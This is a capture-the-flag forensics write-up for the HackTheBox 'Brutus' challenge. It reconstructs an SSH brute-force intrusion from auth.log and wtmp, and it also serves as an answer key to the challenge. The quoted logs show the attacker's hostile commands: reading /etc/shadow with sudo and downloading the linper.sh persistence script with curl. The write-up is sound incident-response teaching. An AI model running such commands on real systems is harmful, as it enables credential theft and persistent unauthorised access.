# HackTheBox Sherlock: Brutus — Full CTF Writeup

**Platform:** HackTheBox Sherlocks  
**Difficulty:** Easy  
**Category:** Digital Forensics / Incident Response  
**Author:** Babygirl  

---

## Introduction

> "This challenge is rated **Easy** but teaches **real-world incident response skills** used by professional SOC analysts daily — making it one of the most impactful beginner Sherlocks on HackTheBox."

| Category | Rating |
|----------|--------|
| Difficulty | ⭐⭐ Easy |
| Real-world relevance | ⭐⭐⭐⭐⭐ Very High |
| Skills learned | Log analysis, DFIR, MITRE ATT&CK |
| Beginner friendly | ✅ Yes |

Brutus is a beginner-friendly forensics challenge on HackTheBox that puts you in the shoes of a security analyst responding to a server compromise. You're given two artifacts from a Linux server — `auth.log` and `wtmp` — and tasked with reconstructing what happened during an SSH brute-force attack and subsequent intrusion.

This writeup walks through every step, every command, and explains *why* each command was used — so you can learn from the methodology, not just the answers.

---

## Artifacts Provided

Inside `Brutus.zip`:
- **`auth.log`** — Linux authentication log. Records every login attempt, success, failure, sudo usage, and session activity.
- **`wtmp`** — Binary file that records all login/logout sessions on the system.

---

## Setting Up — Extracting the ZIP

### Why normal `unzip` didn't work

```bash
unzip Brutus.zip
```

This gave an error:
```
skipping: auth.log  unsupported compression method 99
skipping: wtmp      unsupported compression method 99
```

**Why?** Compression method 99 means the ZIP was created with **AES-256 encryption + 7-Zip compression**, which the standard `unzip` tool doesn't support.

### Fix — Use 7z

```bash
sudo apt install p7zip-full
7z x Brutus.zip
```

**Why `7z x`?** The `x` flag extracts files preserving the full path. 7-Zip supports AES-256 ZIP compression, so it extracts what `unzip` cannot.

After extraction:
```bash
ls
# auth.log  Brutus.zip  utmp.py  wtmp
```

---

## Reading the wtmp Binary File

The `wtmp` file is a **binary file** — you cannot read it with `cat`. It stores structured records of every user login and logout session.

### Convert wtmp to readable format

```bash
python3 utmp.py -o output.tsv wtmp
```

**Breaking down the command:**
| Part | What it does |
|------|-------------|
| `python3` | Run using Python 3 interpreter |
| `utmp.py` | The parser script included in the zip |
| `-o` | Output flag — save result to a file |
| `output.tsv` | Output filename (Tab Separated Values — like a spreadsheet) |
| `wtmp` | The binary input file to parse |

**Why TSV?** Binary → readable text. TSV lets you view it cleanly and also filter with `grep`.

### Alternative — Built-in `last` command

```bash
last -f wtmp
```

The `last` command is a Linux built-in that reads wtmp and displays login history in human-readable format.

---

## Analyzing the Logs

### Task 1 — How many brute-force attempts were made?

```bash
cat auth.log | grep "Failed password"
```

**Why?** Every failed SSH login generates a `Failed password` entry in auth.log. Counting these reveals the scale of the brute-force attack.

The logs showed hundreds of failed attempts from IP **65.2.161.68** targeting the `root` account.

---

### Task 2 — Which account did the attacker successfully access?

```bash
cat auth.log | grep "Accepted"
```

Output:
```
Mar 6 06:19:54 sshd[1465]: Accepted password for root from 203.101.190.9
Mar 6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68
Mar 6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68
Mar 6 06:37:34 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68
```

**Answer: `root`**

The attacker brute-forced the `root` account from IP **65.2.161.68**.

---

### Task 3 — UTC timestamp of the attacker's manual login (from wtmp)?

```bash
cat output.tsv | grep root
```

The wtmp output showed two root sessions on 2024/03/06:
- `2024/03/06 01:19:55` — from 203.101.190.9 (different IP)
- `2024/03/06 01:32:45` — from **65.2.161.68** (attacker's IP)

However, wtmp timestamps were stored in **local time (IST = UTC+5:30)**, not UTC. Cross-referencing with auth.log:

```bash
cat auth.log | grep "Accepted" | grep "65.2.161.68"
```

```
Mar 6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68
```

auth.log uses **UTC**. Combining auth.log's UTC hour/minute (`06:32`) with wtmp's seconds (`:45`):

**Answer: `2024-03-06 06:32:45`**

> **Key lesson:** Always cross-reference wtmp with auth.log when looking for UTC timestamps. wtmp may reflect local system time.

---

### Task 4 — What session number was assigned to the attacker's root session?

```bash
cat auth.log | grep "New session" | grep root
```

Output:
```
Mar 6 06:19:54 systemd-logind[411]: New session 6 of user root.
Mar 6 06:31:40 systemd-logind[411]: New session 34 of user root.
Mar 6 06:32:44 systemd-logind[411]: New session 37 of user root.
```

The attacker's session via sshd[2491] at 06:32:44 was assigned **session 37**.

**Answer: `37`**

**Why does this matter?** Session numbers help correlate events across log sources. If you see `Session 37 logged out`, you immediately know that's the attacker's session ending.

---

### Task 5 — What new user account did the attacker create?

```bash
cat auth.log | grep "new user"
```

Output:
```
Mar 6 06:34:18 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002,
home=/home/cyberjunkie, shell=/bin/bash
```

Then to confirm higher privileges:
```bash
cat auth.log | grep "cyberjunkie" | grep "sudo"
```

```
Mar 6 06:35:15 usermod[2628]: add 'cyberjunkie' to group 'sudo'
```

**Answer: `cyberjunkie`**

The attacker created this backdoor account and immediately added it to the `sudo` group — giving it root-level privileges for persistent access.

---

### Task 6 — What is the MITRE ATT&CK sub-technique ID for this persistence method?

The attacker created a **local user account** on the compromised server. In the MITRE ATT&CK framework:

- **Tactic:** Persistence
- **Technique:** T1136 — Create Account
- **Sub-technique:** T1136.001 — Local Account

**Answer: `T1136.001`**

**Why MITRE?** MITRE ATT&CK is the industry-standard framework for classifying attacker behavior. Tagging techniques with MITRE IDs helps security teams communicate findings clearly and map defenses accordingly.

---

### Task 7 — When did the attacker's first SSH session end?

```bash
cat auth.log | grep "sshd\[2491\]"
```

Output:
```
Mar 6 06:37:24 sshd[2491]: Received disconnect from 65.2.161.68 port 53184
Mar 6 06:37:24 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar 6 06:37:24 sshd[2491]: pam_unix(sshd:session): session closed for user root
```

**Answer: `2024-03-06 06:37:24`**

**Why filter by sshd PID?** Each SSH connection gets a unique process ID (PID). Filtering by `sshd[2491]` shows only events for that specific session — connect, activity, and disconnect.

---

### Task 8 — What sudo command did the attacker run with the cyberjunkie account?

```bash
cat auth.log | grep "sudo" | grep "cyberjunkie"
```

Output:
```
Mar 6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ;
USER=root ; COMMAND=/usr/bin/cat /etc/shadow

Mar 6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ;
USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`**

The attacker:
1. First read `/etc/shadow` (password hashes for all users)
2. Then downloaded **linper.sh** — a Linux persistence script from GitHub

**Why is this critical?** `linper.sh` is a known attacker tool that installs multiple persistence mechanisms. Downloading it via `curl` is a classic **Living off the Land** technique — using built-in system tools to avoid detection.

---

## Full Attack Timeline

| Time (UTC) | Event |
|------------|-------|
| 06:19:54 | First root login from 203.101.190.9 (recon/initial access) |
| 06:31:39 | Brute-force begins from 65.2.161.68 |
| 06:31:40 | First successful root login from 65.2.161.68 (brief session) |
| 06:32:44 | Second root login — attacker establishes working session (Session 37) |
| 06:34:18 | Backdoor user `cyberjunkie` created |
| 06:35:15 | `cyberjunkie` added to sudo group |
| 06:37:24 | Root session (Session 37) ends |
| 06:37:34 | Attacker logs in as `cyberjunkie` |
| 06:37:57 | `cyberjunkie` reads `/etc/shadow` via sudo |
| 06:39:38 | `cyberjunkie` downloads persistence script via curl |

---

## Key Commands Summary

```bash
# Extract AES-encrypted zip
7z x Brutus.zip

# Parse binary wtmp to readable TSV
python3 utmp.py -o output.tsv wtmp

# View login history from wtmp
last -f wtmp

# Find all successful logins
cat auth.log | grep "Accepted"

# Find all failed login attempts
cat auth.log | grep "Failed password"

# Find new session assignments
cat auth.log | grep "New session"

# Find new user creation
cat auth.log | grep "new user"

# Find sudo commands run
cat auth.log | grep "sudo" | grep "cyberjunkie"

# Find session disconnect
cat auth.log | grep "Disconnected"
```

---

## Impact in Real-World Incident Response

This challenge mirrors a **real SSH brute-force intrusion** scenario. Here's why these skills matter:

**1. Log Correlation is Everything**
Auth.log and wtmp tell different parts of the story. A real analyst must correlate both — just like we combined wtmp seconds with auth.log UTC hours to get the correct timestamp.

**2. Backdoor Account Creation = Persistence**
Creating `cyberjunkie` and adding it to sudo is a textbook persistence tactic (MITRE T1136.001). In real IR, finding this account means the attacker planned to return — even if the original breach is closed, the backdoor remains.

**3. `/etc/shadow` Access = Credential Theft**
Reading shadow files gives the attacker hashed passwords for every user. These can be cracked offline and used to pivot to other systems.

**4. Downloading External Scripts = Second Stage Payload**
The `curl` to GitHub for `linper.sh` is a second-stage payload delivery. In real IR, this would trigger network-level alerts and the URL would be immediately blocked and investigated.

**5. MITRE ATT&CK Mapping Speeds Response**
Tagging each attacker action with a MITRE ID lets the IR team quickly understand the threat, brief management, and apply the right detections — saving hours during an active incident.

---

## Conclusion

Brutus is a fantastic introductory Sherlock that teaches core Digital Forensics and Incident Response (DFIR) skills: log analysis, binary artifact parsing, timeline reconstruction, and MITRE ATT&CK mapping. The attacker's full kill chain — brute-force → root access → backdoor account → credential theft → persistence script — is a pattern seen in real-world intrusions every day.

**Tools used:** `7z`, `python3`, `cat`, `grep`, `last`  
**Skills practiced:** Log analysis, binary forensics, timeline reconstruction, MITRE ATT&CK  

---

*Written by Babygirl | HackTheBox Sherlock: Brutus*